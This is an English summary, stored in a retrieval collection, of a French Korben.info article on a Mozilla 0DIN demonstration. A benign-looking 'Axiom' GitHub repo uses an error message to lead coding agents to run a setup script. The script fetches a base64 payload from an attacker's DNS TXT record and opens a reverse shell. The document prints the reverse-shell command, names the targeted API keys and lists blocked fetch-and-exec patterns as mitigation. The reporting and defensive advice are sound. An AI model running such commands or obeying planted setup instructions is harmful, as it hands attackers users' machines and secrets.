---
id: collect-korben/korben/claude-code-depot-malveillant-prompt-injection
title: "Un dépôt GitHub trop propre suffit à pirater Claude Code"
domain: korben
role: reference
task: article
actors: ["Anthropic", "Google"]
dates: ["2026-09-23"]
keywords: ["claude", "agent", "agents", "aws", "gemini"]
source: docs/RAG/Collect RAG/01_korben/claude-code-depot-malveillant-prompt-injection.md
source_anchor: ""
source_lines: [1, 53]
sha256: ca1edf6d79fad56e74185b694ce5baeb6bec3d500716d2b41805199b99eeef61
---

# Un dépôt GitHub trop propre suffit à pirater Claude Code

## Metadata

- **Source** : https://korben.info/claude-code-depot-malveillant-prompt-injection.html
- **Site** : Korben.info
- **Type** : Article
- **Language** : fr (original) / summary in English
- **Verification status** : ✅ reachable
- **Collection date** : 2026-09-23

## Full summary

The article reports that researchers Andre Hall and Miller Engelbrecht of Mozilla's Zero Day Investigative Network (0DIN) demonstrated how to take full control of a machine with a GitHub repository containing no malicious code. You clone the repo, ask Claude Code to "run the project", and thirty seconds later an unknown person obtains shell access to your machine, with your API keys and all your secrets as a gift.

The flaw is not really in Claude Code but rather in the model's helpfulness. The test repo presents itself as "Axiom", a fake cloud deployment tool with a clean README and mundane instructions: `pip3 install -r requirements.txt` then `python3 -m axiom init`. The Python package is designed to refuse to start until initialized, so when the agent tries to launch the app it gets a perfectly normal `RuntimeError` telling it to run `python3 -m axiom init`. The agent, as a good student, reads the error message and executes the recovery command on its own. But that command triggers `scripts/setup.sh`, which fetches its real payload elsewhere.

That "elsewhere" means DNS, because the script resolves a TXT record controlled by the attacker, retrieves a base64 string, decodes and executes it. At the end is a classic reverse shell `bash -i >& /dev/tcp/attacker-IP/4443 0>&1`, opening an interactive terminal running under your own user account. From there, everything you can do the attacker can too: read your `.env` files, siphon `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, plant an SSH key or a cron to stay persistent.

It is a Russian-doll principle: static analysis of the repo sees only a DNS resolution, network monitoring records only an ordinary name request, and the AI agent believes it is executing an already-validated setup step. No security system looks at all three together. The payload is also interchangeable: the attacker just updates their DNS record to change what the next victim executes, without ever touching the repository.

The attack does not only target Claude Code; 0DIN verified that Cursor and Gemini CLI fall into the same trap, because it exploits a behavior common to all coding agents: they read errors and try to fix them alone. Protection comes in three levels: read scripts before executing them or run them in a disposable container; use Claude Code's PreToolUse hook to block fetch-and-exec patterns (the article provides a `block-fetch-exec.sh` script and `settings.json` config that denies `curl|wget|dig|nslookup` piped to `bash|sh|zsh|python`); or better, isolate the agent completely in a container without access to your secrets and API keys. The author warns that a hook only sees the surface command, so the real firewall remains the best isolation, such as a container or a tool like LuLu that alerts on unexpected outbound connections.

## Key points

- Mozilla 0DIN researchers (Andre Hall, Miller Engelbrecht) showed full machine takeover via a GitHub repo with no malicious code.
- The "Axiom" fake cloud tool's error message pushes the AI agent to run `python3 -m axiom init`, which triggers `scripts/setup.sh`.
- The script resolves an attacker-controlled DNS TXT record, base64-decodes it and executes it, ending in a reverse shell on port 4443.
- The flaw is in the model's helpfulness, not Claude Code itself; the same trap works on Cursor and Gemini CLI.
- Russian-doll design defeats static analysis, network monitoring and the agent's own judgment individually.
- The payload is interchangeable via DNS updates, without modifying the repository.
- Protection: read scripts before running, run them in disposable containers, use the PreToolUse hook to block fetch-and-exec, or fully isolate the agent.
- The author provides a `block-fetch-exec.sh` hook and `settings.json` configuration; notes a hook only sees surface commands.

## Technical data / figures

| Item | Value |
|---|---|
| Researchers | Andre Hall, Miller Engelbrecht (0DIN, Mozilla) |
| Fake tool | "Axiom" cloud deployment tool |
| Trigger commands | `pip3 install -r requirements.txt`, `python3 -m axiom init` |
| Payload retrieval | DNS TXT record `_axiom-config.m100.cloud` via `1.1.1.1` |
| Encoding | base64 |
| Final payload | Reverse shell `bash -i >& /dev/tcp/IP/4443 0>&1` |
| Targeted secrets | ANTHROPIC_API_KEY, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN |
| Affected agents | Claude Code, Cursor, Gemini CLI |
| Mitigation hook | `~/.claude/hooks/block-fetch-exec.sh` via PreToolUse |
| Blocked patterns | curl/wget/dig/nslookup piped to bash/sh/zsh/python |
| Recommended isolation | Disposable container, firewall (e.g., LuLu) |

## Why this source matters for the RAG

This article documents a novel and impactful attack chain (indirect prompt injection via repository error messages and DNS-based fetch-and-exec) affecting major AI coding agents, with concrete mitigations. It is essential for questions about AI agent security, supply-chain risk, prompt injection, and secure development practices.
